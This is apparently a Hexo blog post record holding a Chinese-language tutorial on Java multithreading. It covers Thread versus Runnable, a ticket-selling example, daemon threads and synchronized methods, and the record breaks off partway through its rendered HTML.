两种实现多线程方式的对比分析\n\n直接继承Thread类和实现Runnable接口都能实现多线程,具体有什么区别呢\n\n1.从java的设计来看,通过继承Thread或者实现Runnable接口来创建线程本质上都没有区别,Thread类本身就实现了Runnable接口\n\n2.实现Runnable接口方式更加适合多个线程共享一个资源的情况,并且避免了单继承的限制\n\n#### 直接继承Thread\n\n通过两段代码来对比一下\n\n```java\npublic class S8_1 {\n    public static void main(String[] args) {\n        new TicketWindow().start();\n        new TicketWindow().start();\n        new TicketWindow().start();\n        new TicketWindow().start();\n    }\n}\nclass TicketWindow extends Thread{\n    private int tickies=100;\n    @Override\n    //重写run方法\n    public void run(){\n        while(true){\n            if(tickies>0){\n                Thread th= Thread.currentThread();//获取当前线程\n                String th_name=th.getName();//获取当前线程名称\n                System.out.println(th_name+\"正在发售\"+tickies--+\"张票\");\n            }\n        }\n    }\n}\n\n```\n\n![image-20211223233326400](/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211223233326400.png)\n\n由运行结果可知,当前每个线程处于\"各卖各的票\"的情况,对tickies没有实现共享\n\n##### 为什么不调用run方法而调用start方法?\n\n因为run方法就只是一个普通的方法,没有真正的启动一个线程\n\n```java\n(1)\npublic synchronized void start(){\n    start0();\n}\n\n(2)\nprivate native void start0();\n//start0()是本地方法(native),是JVM调用,底层是c/c++实现\n//真正实现多线程的效果,是start0()方法\n```\n\n**start()方法调用start0()方法后,该线程并不一定会立刻执行,只是将线程变成了可运行状态,具体什么时候执行,取决于cpu,由cpu统一调度**\n\n#### 实现Runnable接口\n\n##### 代理模式\n\n<span id=\"example\">例子</span>\n\n该方法底层使用了一个设计模式**线程代理模式**,接下来用代码进行模拟,代码和真正有差别,但是原理一样\n\n```java\npublic class proxy {\n    public static void main(String[] args) {\n        Tiger tiger=new Tiger();//Tiger类实现了Runnable接口\n        ThreadProxy threadProxy = new ThreadProxy(tiger);//为什么能把tiger放进去,因为tiger实现了Runnable\n        threadProxy.start();\n    }\n}\nclass Animal{\n\n}\nclass Tiger extends Animal implements Runnable{\n\n    @Override\n    public void run() {\n        System.out.println(\"老虎嗷嗷叫\");\n    }\n}\nclass ThreadProxy implements Runnable{\n    private Runnable target =null;//类型是Runnable的属性\n    @Override\n    public void run() {\n        if(target!=null){\n            target.run();//动态绑定,最后调用的还是tiger的run\n        }\n    }\n    //构造方法\n    public ThreadProxy(Runnable target){\n        this.target=target;\n    }\n    public void start(){\n        start0();\n    }\n    public void start0(){\n        run();\n    }\n}\n\n总的来说就是,Tiger没有start方法,但是通过实现Runnable接口,就可以通过Runnable做中间代理从而使用Runnable中的start方法来调用Tiger的run方法实现线程的启动\n```\n\n在通常的开发当中，一般会选择实现Runnable接口，原因有二：\n1、避免单继承的局限，在Java当中一个类可以实现多个接口，但只能继承一个类\n2、适合资源的共享\n\n缺点:编程多一层对象包装,如果线程有执行结果是不可以直接返回的\n\n<span id=\"sell\">售票程序</span>\n\n```java\npublic class S8_1 {\n    public static void main(String[] args) {\n         TicketWindow tw=new TicketWindow();//创建TicketWindow的实例对象tw\n        //这几个线程其实都在执行tw这个对象\n         new Thread(tw,\"窗口1\").start();\n         new Thread(tw,\"窗口2\").start();\n         new Thread(tw,\"窗口3\").start();\n         new Thread(tw,\"窗口4\").start();\n    }\n}\nclass TicketWindow implements Runnable{\n    private int tickies=100;\n    public void run(){\n        while(true){\n            if(tickies>0){\n                Thread th= Thread.currentThread();//获取当前线程\n                String th_name=th.getName();//获取线程名称\n                System.out.println(th_name+\"正在发售\"+tickies--+\"张票\");\n            }\n        }\n    }\n}\n//可能会出现超卖的现象\n```\n\n<img src=\"/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211223234915498.png\" alt=\"image-20211223234915498\" style=\"zoom:67%;\" />\n\n这样就不会出现重复卖票的情况,实现了tickies的共享\n\nRunnable接口还可以通过匿名对象来实现\n\n```java\npublic class test {\n    public static void main(String[] args) {\n        Runnable target=new Runnable() {\n            @Override\n            public void run() {\n                System.out.println(\"子线程\");\n            }\n        };\n        Thread t=new Thread(target);\n        t.start();\n    }\n}\n\n```\n\n还可以进一步简化上面的代码\n\n```java\npublic class test {\n    public static void main(String[] args) {\n        new Thread(new Runnable() {\n            @Override\n            public void run() {\n                System.out.println(\"子线程\");\n            }\n        }).start();\n    }\n}\n\n//jdk8后更简化\nnew Thread(()->{\n            System.out.println(\"子线程2\");\n        }).start();\n\n\n```\n\n#### 第三种多线程实现方案\n\n##### 利用Callable,FutureTask接口实现\n\n\n\n\n\n![image-20211224011547555](/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211224011547555.png)\n\n\n\n##### 线程的常用方法\n\nsetName //设置线程名称,使之与参数name相同\n\ngetName  //返回该线程的名称\n\n常用`Thread.currentThread().getName()`\n\nstart //使该线程开始执行,java虚拟机底层调用该线程的start0方法\n\nrun //调用线程对象run方法\n\nsetPriority //更改线程优先级\n\ngetPriority //获取线程的优先级\n\nsleep //在指定的毫秒数内让当前正在执行的线程休眠\n\ninterrupt //中断线程,但是并没有真正结束线程,往往是中断休眠sleep,转而执行catch中的语句\n\n\n\nyield //是Thread的静态方法,直接`Thread.yield()`调用即可线程的礼让,让出cpu,让其他线程执行,但让出的时间不确定,所以也不一定礼让成功\n\njoin //线程的插队.插队的线程一旦插队成功,则肯定先执行完插入的线程所有的任务\n\n案例:创建一个子线程,每隔1s输出hello,输出20次,主线程每隔一秒,输出hi,输出20次,要求:两个完成同时执行,当主线程输出5次后,就让子线程运行完毕,主线程再继续\n\n\n\n\n\n##### 用户线程和守护线程\n\n1.用户线程:也叫工作线程,当线程的任务执行完或通知方式结束\n\n2.守护线程:一般是为工作线程服务的,当所有的用户线程结束,守护线程自动结束\n\n3.常见的守护线程:垃圾回收机制\n\n##### 如何把一个子线程设置为守护线程\n\n`myDaemonThread.setDaemon(true)`就可以把一个子线程设置为守护线程,主线程结束 它也结束\n\n```java\npublic class S8_5 {\n    public static void main(String[] args) throws Exception{\n        MyDaemonThread myDaemonThread=new MyDaemonThread();\n        myDaemonThread.setDaemon(true);\n        myDaemonThread.start();\n        for(int i=0;i<3;i++){\n            System.out.println(\"主线程运行中\");\n\n        }\n    }\n}\nclass MyDaemonThread extends Thread{\n    @Override\n    public void run(){\n        while(true) {\n            System.out.println(\"子线程运行中\");\n        }\n    }\n}\n```\n\n主线程结束后,子线程也会结束\n\n\n\n##### 线程的生命周期\n\n<img src=\"/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211225234147135.png\" style=\"zoom: 80%;\" />\n\n#### 线程同步机制\n\n在多线程编程中,一些敏感数据不允许被多个线程同时访问,此时就使用同步访问技术,保证数据在任何统一时刻,最多有一个线程访问,以保证数据的完整性\n\n也可以这样理解:线程同步,即当有一个线程在对内存进行操作时,其他线程都不可以对这个内存地址进行操作,知道该线程完成操作,其他线程才能对该内存地址进行操作\n\n##### 同步具体方法\n\n1.同步代码块\n\n```java\nsynchronized(对象){//得到对象的锁,才能操作同步代码\n\t//需要被同步的代码\n}\n```\n\n2.synchronized还可以放在方法声明中,表示整个方法为同步方法\n\n```java\npublic synchronized void m(String name){\n\t//需要被同步的代码\n}\n```\n\n3.如何理解\n\n就好像上厕所,A上厕所关上门(上锁),完事出来后(解锁),那么其他人就可以再使用厕所了\n\n例子\n\n之前的售票窗口程序,通过继承Runnable接口,虽然实现了票数的共享,但是售票顺序是乱的\n\n[售票窗口程序](#sell)\n\n通过线程同步,就可以实现每次只卖一张票,也就是每次只允许一个线程访问tickies变量并执行,这样还可以防止超卖现象\n\n```java\npublic class S8_1 {\n    public static void main(String[] args) {\n         TicketWindow tw=new TicketWindow();\n         new Thread(tw,\"窗口1\").start();\n         new Thread(tw,\"窗口2\").start();\n         new Thread(tw,\"窗口3\").start();\n         new Thread(tw,\"窗口4\").start();\n    }\n}\nclass TicketWindow implements Runnable{\n    private int tickies=100;\n    private boolean loop=true;\n    public synchronized void sell(){\n            if(tickies>0){\n                Thread th= Thread.currentThread();//获取当前线程\n                String th_name=th.getName();//获取线程名称\n                System.out.println(th_name+\"正在发售\"+tickies--+\"张票\");\n            }else{\n                loop=false;\n            }\n    }\n    public void run(){\n        while(loop){\n            sell();//sell是一种同步方法\n        }\n    }\n}\n```\n\n由运行结果可知,票按照tickies大小逐次递减卖出,就是不知道为啥,每次只有一到两个线程能抢到cpu资源并且执行\n\n![image-20211226000540093](/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211226000540093.png)\n","source":"_posts/java多线程.md","raw":"---\ntitle: java多线程\ndate: 2021-12-23 23:24:47\ntags: \n     - java\n     - 多线程\ncategories: java\ndescription: java多线程\ntypora-root-url: ..\n---\n\n#### 多线程相关概念\n\n并发:同一个时刻,多个任务交替执行,造成一种貌似同时的错觉,简单的说,单核CPU实现的多任务就是并发\n\n并行:同一个时刻,多个任务同时执行,多核CPU可以实现并行\n\n#### 两种实现多线程方式的对比分析\n\n直接继承Thread类和实现Runnable接口都能实现多线程,具体有什么区别呢\n\n1.从java的设计来看,通过继承Thread或者实现Runnable接口来创建线程本质上都没有区别,Thread类本身就实现了Runnable接口\n\n2.实现Runnable接口方式更加适合多个线程共享一个资源的情况,并且避免了单继承的限制\n\n#### 直接继承Thread\n\n通过两段代码来对比一下\n\n```java\npublic class S8_1 {\n    public static void main(String[] args) {\n        new TicketWindow().start();\n        new TicketWindow().start();\n        new TicketWindow().start();\n        new TicketWindow().start();\n    }\n}\nclass TicketWindow extends Thread{\n    private int tickies=100;\n    @Override\n    //重写run方法\n    public void run(){\n        while(true){\n            if(tickies>0){\n                Thread th= Thread.currentThread();//获取当前线程\n                String th_name=th.getName();//获取当前线程名称\n                System.out.println(th_name+\"正在发售\"+tickies--+\"张票\");\n            }\n        }\n    }\n}\n\n```\n\n![image-20211223233326400](/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211223233326400.png)\n\n由运行结果可知,当前每个线程处于\"各卖各的票\"的情况,对tickies没有实现共享\n\n##### 为什么不调用run方法而调用start方法?\n\n因为run方法就只是一个普通的方法,没有真正的启动一个线程\n\n```java\n(1)\npublic synchronized void start(){\n    start0();\n}\n\n(2)\nprivate native void start0();\n//start0()是本地方法(native),是JVM调用,底层是c/c++实现\n//真正实现多线程的效果,是start0()方法\n```\n\n**start()方法调用start0()方法后,该线程并不一定会立刻执行,只是将线程变成了可运行状态,具体什么时候执行,取决于cpu,由cpu统一调度**\n\n#### 实现Runnable接口\n\n##### 代理模式\n\n<span id=\"example\">例子</span>\n\n该方法底层使用了一个设计模式**线程代理模式**,接下来用代码进行模拟,代码和真正有差别,但是原理一样\n\n```java\npublic class proxy {\n    public static void main(String[] args) {\n        Tiger tiger=new Tiger();//Tiger类实现了Runnable接口\n        ThreadProxy threadProxy = new ThreadProxy(tiger);//为什么能把tiger放进去,因为tiger实现了Runnable\n        threadProxy.start();\n    }\n}\nclass Animal{\n\n}\nclass Tiger extends Animal implements Runnable{\n\n    @Override\n    public void run() {\n        System.out.println(\"老虎嗷嗷叫\");\n    }\n}\nclass ThreadProxy implements Runnable{\n    private Runnable target =null;//类型是Runnable的属性\n    @Override\n    public void run() {\n        if(target!=null){\n            target.run();//动态绑定,最后调用的还是tiger的run\n        }\n    }\n    //构造方法\n    public ThreadProxy(Runnable target){\n        this.target=target;\n    }\n    public void start(){\n        start0();\n    }\n    public void start0(){\n        run();\n    }\n}\n\n总的来说就是,Tiger没有start方法,但是通过实现Runnable接口,就可以通过Runnable做中间代理从而使用Runnable中的start方法来调用Tiger的run方法实现线程的启动\n```\n\n在通常的开发当中，一般会选择实现Runnable接口，原因有二：\n1、避免单继承的局限，在Java当中一个类可以实现多个接口，但只能继承一个类\n2、适合资源的共享\n\n缺点:编程多一层对象包装,如果线程有执行结果是不可以直接返回的\n\n<span id=\"sell\">售票程序</span>\n\n```java\npublic class S8_1 {\n    public static void main(String[] args) {\n         TicketWindow tw=new TicketWindow();//创建TicketWindow的实例对象tw\n        //这几个线程其实都在执行tw这个对象\n         new Thread(tw,\"窗口1\").start();\n         new Thread(tw,\"窗口2\").start();\n         new Thread(tw,\"窗口3\").start();\n         new Thread(tw,\"窗口4\").start();\n    }\n}\nclass TicketWindow implements Runnable{\n    private int tickies=100;\n    public void run(){\n        while(true){\n            if(tickies>0){\n                Thread th= Thread.currentThread();//获取当前线程\n                String th_name=th.getName();//获取线程名称\n                System.out.println(th_name+\"正在发售\"+tickies--+\"张票\");\n            }\n        }\n    }\n}\n//可能会出现超卖的现象\n```\n\n<img src=\"/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211223234915498.png\" alt=\"image-20211223234915498\" style=\"zoom:67%;\" />\n\n这样就不会出现重复卖票的情况,实现了tickies的共享\n\nRunnable接口还可以通过匿名对象来实现\n\n```java\npublic class test {\n    public static void main(String[] args) {\n        Runnable target=new Runnable() {\n            @Override\n            public void run() {\n                System.out.println(\"子线程\");\n            }\n        };\n        Thread t=new Thread(target);\n        t.start();\n    }\n}\n\n```\n\n还可以进一步简化上面的代码\n\n```java\npublic class test {\n    public static void main(String[] args) {\n        new Thread(new Runnable() {\n            @Override\n            public void run() {\n                System.out.println(\"子线程\");\n            }\n        }).start();\n    }\n}\n\n//jdk8后更简化\nnew Thread(()->{\n            System.out.println(\"子线程2\");\n        }).start();\n\n\n```\n\n#### 第三种多线程实现方案\n\n##### 利用Callable,FutureTask接口实现\n\n\n\n\n\n![image-20211224011547555](/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211224011547555.png)\n\n\n\n##### 线程的常用方法\n\nsetName //设置线程名称,使之与参数name相同\n\ngetName  //返回该线程的名称\n\n常用`Thread.currentThread().getName()`\n\nstart //使该线程开始执行,java虚拟机底层调用该线程的start0方法\n\nrun //调用线程对象run方法\n\nsetPriority //更改线程优先级\n\ngetPriority //获取线程的优先级\n\nsleep //在指定的毫秒数内让当前正在执行的线程休眠\n\ninterrupt //中断线程,但是并没有真正结束线程,往往是中断休眠sleep,转而执行catch中的语句\n\n\n\nyield //是Thread的静态方法,直接`Thread.yield()`调用即可线程的礼让,让出cpu,让其他线程执行,但让出的时间不确定,所以也不一定礼让成功\n\njoin //线程的插队.插队的线程一旦插队成功,则肯定先执行完插入的线程所有的任务\n\n案例:创建一个子线程,每隔1s输出hello,输出20次,主线程每隔一秒,输出hi,输出20次,要求:两个完成同时执行,当主线程输出5次后,就让子线程运行完毕,主线程再继续\n\n\n\n\n\n##### 用户线程和守护线程\n\n1.用户线程:也叫工作线程,当线程的任务执行完或通知方式结束\n\n2.守护线程:一般是为工作线程服务的,当所有的用户线程结束,守护线程自动结束\n\n3.常见的守护线程:垃圾回收机制\n\n##### 如何把一个子线程设置为守护线程\n\n`myDaemonThread.setDaemon(true)`就可以把一个子线程设置为守护线程,主线程结束 它也结束\n\n```java\npublic class S8_5 {\n    public static void main(String[] args) throws Exception{\n        MyDaemonThread myDaemonThread=new MyDaemonThread();\n        myDaemonThread.setDaemon(true);\n        myDaemonThread.start();\n        for(int i=0;i<3;i++){\n            System.out.println(\"主线程运行中\");\n\n        }\n    }\n}\nclass MyDaemonThread extends Thread{\n    @Override\n    public void run(){\n        while(true) {\n            System.out.println(\"子线程运行中\");\n        }\n    }\n}\n```\n\n主线程结束后,子线程也会结束\n\n\n\n##### 线程的生命周期\n\n<img src=\"/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211225234147135.png\" style=\"zoom: 80%;\" />\n\n#### 线程同步机制\n\n在多线程编程中,一些敏感数据不允许被多个线程同时访问,此时就使用同步访问技术,保证数据在任何统一时刻,最多有一个线程访问,以保证数据的完整性\n\n也可以这样理解:线程同步,即当有一个线程在对内存进行操作时,其他线程都不可以对这个内存地址进行操作,知道该线程完成操作,其他线程才能对该内存地址进行操作\n\n##### 同步具体方法\n\n1.同步代码块\n\n```java\nsynchronized(对象){//得到对象的锁,才能操作同步代码\n\t//需要被同步的代码\n}\n```\n\n2.synchronized还可以放在方法声明中,表示整个方法为同步方法\n\n```java\npublic synchronized void m(String name){\n\t//需要被同步的代码\n}\n```\n\n3.如何理解\n\n就好像上厕所,A上厕所关上门(上锁),完事出来后(解锁),那么其他人就可以再使用厕所了\n\n例子\n\n之前的售票窗口程序,通过继承Runnable接口,虽然实现了票数的共享,但是售票顺序是乱的\n\n[售票窗口程序](#sell)\n\n通过线程同步,就可以实现每次只卖一张票,也就是每次只允许一个线程访问tickies变量并执行,这样还可以防止超卖现象\n\n```java\npublic class S8_1 {\n    public static void main(String[] args) {\n         TicketWindow tw=new TicketWindow();\n         new Thread(tw,\"窗口1\").start();\n         new Thread(tw,\"窗口2\").start();\n         new Thread(tw,\"窗口3\").start();\n         new Thread(tw,\"窗口4\").start();\n    }\n}\nclass TicketWindow implements Runnable{\n    private int tickies=100;\n    private boolean loop=true;\n    public synchronized void sell(){\n            if(tickies>0){\n                Thread th= Thread.currentThread();//获取当前线程\n                String th_name=th.getName();//获取线程名称\n                System.out.println(th_name+\"正在发售\"+tickies--+\"张票\");\n            }else{\n                loop=false;\n            }\n    }\n    public void run(){\n        while(loop){\n            sell();//sell是一种同步方法\n        }\n    }\n}\n```\n\n由运行结果可知,票按照tickies大小逐次递减卖出,就是不知道为啥,每次只有一到两个线程能抢到cpu资源并且执行\n\n![image-20211226000540093](/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211226000540093.png)\n","slug":"java多线程","published":1,"updated":"2022-01-07T13:31:06.118Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9mk0017gsw9an742dxw","content":"<h4 id=\"多线程相关概念\"><a href=\"#多线程相关概念\" class=\"headerlink\" title=\"多线程相关概念\"></a>多线程相关概念</h4><p>并发:同一个时刻,多个任务交替执行,造成一种貌似同时的错觉,简单的说,单核CPU实现的多任务就是并发</p>\n<p>并行:同一个时刻,多个任务同时执行,多核CPU可以实现并行</p>\n<h4 id=\"两种实现多线程方式的对比分析\"><a href=\"#两种实现多线程方式的对比分析\" class=\"headerlink\" title=\"两种实现多线程方式的对比分析\"></a>两种实现多线程方式的对比分析</h4><p>直接继承Thread类和实现Runnable接口都能实现多线程,具体有什么区别呢</p>\n<p>1.从java的设计来看,通过继承Thread或者实现Runnable接口来创建线程本质上都没有区别,Thread类本身就实现了Runnable接口</p>\n<p>2.实现Runnable接口方式更加适合多个线程共享一个资源的情况,并且避免了单继承的限制</p>\n<h4 id=\"直接继承Thread\"><a href=\"#直接继承Thread\" class=\"headerlink\" title=\"直接继承Thread\"></a>直接继承Thread</h4><p>通过两段代码来对比一下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">S8_1</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> TicketWindow().start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> TicketWindow().start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> TicketWindow().start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> TicketWindow().start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TicketWindow</span> <span class=\"keyword\">extends</span> <span class=\"title\">Thread</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> tickies=<span class=\"number\">100</span>;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"comment\">//重写run方法</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"keyword\">true</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(tickies&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">                Thread th= Thread.currentThread();<span class=\"comment\">//获取当前线程</span></span><br><span class=\"line\">                String th_name=th.getName();<span class=\"comment\">//获取当前线程名称</span></span><br><span class=\"line\">                System.out.println(th_name+<span class=\"string\">&quot;正在发售&quot;</span>+tickies--+<span class=\"string\">&quot;张票&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211223233326400.png\" alt=\"image-20211223233326400\"></p>\n<p>由运行结果可知,当前每个线程处于”各卖各的票”的情况,对tickies没有实现共享</p>\n<h5 id=\"为什么不调用run方法而调用start方法\"><a href=\"#为什么不调用run方法而调用start方法\" class=\"headerlink\" title=\"为什么不调用run方法而调用start方法?\"></a>为什么不调用run方法而调用start方法?</h5><p>因为run方法就只是一个普通的方法,没有真正的启动一个线程</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">void</span> <span class=\"title\">start</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    start0();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">native</span> <span class=\"keyword\">void</span> <span class=\"title\">start0</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"><span class=\"comment\">//start0()是本地方法(native),是JVM调用,底层是c/c++实现</span></span><br><span class=\"line\"><span class=\"comment\">//真正实现多线程的效果,是start0()方法</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>start()方法调用start0()方法后,该线程并不一定会立刻执行,只是将线程变成了可运行状态,具体什么时候执行,取决于cpu,由cpu统一调度</strong></p>\n<h4 id=\"实现Runnable接口\"><a href=\"#实现Runnable接口\" class=\"headerlink\" title=\"实现Runnable接口\"></a>实现Runnable接口</h4><h5 id=\"代理模式\"><a href=\"#代理模式\" class=\"headerlink\" title=\"代理模式\"></a>代理模式</h5><p><span id=\"example\">例子</span></p>\n<p>该方法底层使用了一个设计模式<strong>线程代理模式</strong>,接下来用代码进行模拟,代码和真正有差别,但是原理一样</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">proxy</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        Tiger tiger=<span class=\"keyword\">new</span> Tiger();<span class=\"comment\">//Tiger类实现了Runnable接口</span></span><br><span class=\"line\">        ThreadProxy threadProxy = <span class=\"keyword\">new</span> ThreadProxy(tiger);<span class=\"comment\">//为什么能把tiger放进去,因为tiger实现了Runnable</span></span><br><span class=\"line\">        threadProxy.start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Animal</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Tiger</span> <span class=\"keyword\">extends</span> <span class=\"title\">Animal</span> <span class=\"keyword\">implements</span> <span class=\"title\">Runnable</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;老虎嗷嗷叫&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ThreadProxy</span> <span class=\"keyword\">implements</span> <span class=\"title\">Runnable</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Runnable target =<span class=\"keyword\">null</span>;<span class=\"comment\">//类型是Runnable的属性</span></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(target!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            target.run();<span class=\"comment\">//动态绑定,最后调用的还是tiger的run</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//构造方法</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ThreadProxy</span><span class=\"params\">(Runnable target)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.target=target;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">start</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        start0();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">start0</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        run();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">总的来说就是,Tiger没有start方法,但是通过实现Runnable接口,就可以通过Runnable做中间代理从而使用Runnable中的start方法来调用Tiger的run方法实现线程的启动</span><br></pre></td></tr></table></figure>\n\n<p>在通常的开发当中，一般会选择实现Runnable接口，原因有二：<br>1、避免单继承的局限，在Java当中一个类可以实现多个接口，但只能继承一个类<br>2、适合资源的共享</p>\n<p>缺点:编程多一层对象包装,如果线程有执行结果是不可以直接返回的</p>\n<p><span id=\"sell\">售票程序</span></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">S8_1</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span 